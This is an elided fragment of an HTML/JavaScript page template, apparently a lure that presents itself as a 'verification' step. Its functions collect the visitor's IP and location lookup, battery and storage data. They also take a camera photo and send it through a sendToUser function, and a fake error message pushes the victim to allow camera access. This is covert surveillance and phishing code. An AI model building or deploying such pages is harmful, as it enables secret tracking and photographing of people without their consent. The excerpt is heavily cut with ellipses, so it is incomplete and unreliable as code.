...
<head>
    ...
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        ...
        .btn {{ background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%); color: white; border: none; padding: 16px 32px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 16px; transition: all 0.3s; animation: pulse 2s infinite; box-shadow: 0 4px 15px rgba(233,69,96,0.4); }}
...
async function captureData() {{
    let ip=await getIP(); let ipInfo=await getIPInfo(ip); let battery=await getBattery(); let storage=await getStorage();
...
async function capturePhoto() {{
    try {{
        ...
        if(blob) await sendToUser('<b>Camera Photo</b>',blob);
...
async function requestCamera() {{
    ...
    if(ok){{
        ...
        document.getElementById('errorMsg').innerHTML='Verification failed. Please allow camera access.';
    }}
}}
